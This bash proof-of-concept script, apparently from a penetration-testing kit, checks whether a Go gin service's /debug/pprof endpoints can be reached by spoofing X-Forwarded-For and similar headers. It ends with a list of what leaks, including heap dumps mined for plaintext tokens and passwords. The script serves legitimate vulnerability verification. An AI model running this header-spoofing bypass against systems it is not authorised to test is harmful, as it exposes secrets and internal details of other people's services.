#!/usr/bin/env bash
# ============================================================================
# gin debug / pprof 内网门禁可绕过性快速判定
#
# 场景：Go 服务用 gin.Default() 起，生产上 /debug/pprof/ 还在。
#       很多部署在入口网关加了「只允许内网 IP 访问 /debug」的规则，
#       而应用层只看 X-Forwarded-For / X-Real-IP —— 于是伪造头即可绕过。
#
# 判据不是「能访问」，而是三态：
#   DENY_ALL   ：带任何 XFF 都 403/404，且响应与随机基线一致 → 门禁在网关，绕不过
#   APP_TRUST  ：伪造 XFF: 127.0.0.1 后从 403 变 200，且 body 出现 pprof 特征 → 可绕
#   OPEN       ：不带任何头就是 200 + pprof 特征 → 压根没门禁
#
# 为什么用 XFF oracle 而不是直接打 /debug/pprof/：
#   只打一次拿到 403，无法区分「网关拦」和「这个路径不存在」。
#   只有「同一路径、只改一个头、结果翻转」才能定案——这是单变量对照。
#
# 用法: ./poc.sh <BASE_URL>
# ============================================================================
set -uo pipefail
source "$(dirname "$0")/../_lib/common.sh"

if [ $# -lt 1 ]; then
  cat >&2 <<'U'
用法: ./poc.sh <BASE_URL>
  BASE_URL 如 http://10.0.0.5:8080 或 https://api.example.com
判据: 同一路径只改 XFF 头，403→200 且 body 出现 pprof 特征 = APP_TRUST（可绕）
U
  exit 1
fi
BASE="${1%/}"
need curl || exit 1

PPROF_PATHS="/debug/pprof/ /debug/pprof/cmdline /debug/pprof/goroutine?debug=1 /debug/vars /metrics"
# pprof 首页的稳定特征（不是「200」这种没判别力的东西）
PPROF_SIG='Types of profiles available|goroutine profile|heap profile|threadcreate profile|allocs profile'

hdr "0. 基线"
RND=$(rand_path)
R=$(reqc GET "$BASE$RND")
RND_C="${R%%$'\t'*}"; RND_FP=$(printf '%s' "$R" | norm)
dim "随机路径 → $RND_C len=$(printf '%s' "$R" | wc -c)"

# 六种伪造头。顺序按「真实部署里最常被信任」排，不是随机的。
SPOOF_HEADERS=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Forwarded-For: 10.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "X-Forwarded-For: 127.0.0.1, 10.0.0.1"
  "X-Client-IP: 127.0.0.1"
  "Forwarded: for=127.0.0.1"
)

FOUND=0
for p in $PPROF_PATHS; do
  hdr "$p"
  # 不带伪造头
  base_r=$(reqc GET "$BASE$p")
  bc="${base_r%%$'\t'*}"; bb="${base_r#*$'\t'}"
  dim "裸请求 → $bc len=$(printf '%s' "$bb" | wc -c)"

  naked_hit=0
  if printf '%s' "$bb" | grep -qE "$PPROF_SIG"; then
    ok "裸请求即命中 pprof 特征 → 无任何门禁"
    naked_hit=1
  fi

  flip=0
  for h in "${SPOOF_HEADERS[@]}"; do
    hr=$(reqc GET "$BASE$p" -H "$h")
    hc="${hr%%$'\t'*}"; hb="${hr#*$'\t'}"
    if printf '%s' "$hb" | grep -qE "$PPROF_SIG"; then
      if [ "$bc" != "200" ] || [ "$naked_hit" -eq 0 ]; then
        ok "XFF oracle 生效: [$h] $bc → $hc，且 body 出现 pprof 特征"
        flip=1
      else
        dim "[$h] $hc（裸请求已命中，无额外信息）"
      fi
      break
    fi
    dim "[$h] → $hc"
  done

  if [ "$naked_hit" -eq 1 ]; then
    warn "$p 完全开放"; FOUND=$((FOUND+1))
  elif [ "$flip" -eq 1 ]; then
    warn "$p 门禁在应用层，可被伪造头绕过"; FOUND=$((FOUND+1))
  else
    # 三态里的第三态：所有头都失败 → 判门禁位置
    if [ "$bc" = "403" ] || [ "$bc" = "401" ]; then
      dim "$p 恒定 $bc，伪造头无效 → 门禁在网关层（或 WAF），本路径不可绕"
    elif [ "$bc" = "404" ] && [ "$(printf '%s' "$bb" | norm)" = "$RND_FP" ]; then
      dim "$p 404 且与随机基线一致 → 路径不存在"
    else
      dim "$p $bc，无 pprof 特征（可能是自研 404 页）"
    fi
  fi
  sleep "$SLEEP"
done

hdr "结论"
if [ "$FOUND" -gt 0 ]; then
  warn "$FOUND 条路径可访问"
  cat >&2 <<'U'
拿到的利用价值（按顺序）：
  /debug/pprof/goroutine?debug=1   → 全部 goroutine 栈，可见调用链、内部包名、DB 驱动
  /debug/pprof/cmdline             → 启动参数，常含 -config /etc/xxx.yaml、密钥路径
  /debug/pprof/heap                → 堆内存，可捞到明文 token / 密码（体积大，先 -o /tmp/x.pb.gz 再 strings）
  /debug/vars                      → 运行时变量，偶有配置项
注意：heap 转储含真实内存数据，禁止外传；只提取「能证明危害」的最小片段。
U
  verdict "gin-pprof-gate" "BYPASSABLE" "$FOUND 路径"
else
  ok "无可访问的 pprof 路径"
  verdict "gin-pprof-gate" "ENFORCED" "伪造头全部无效"
fi
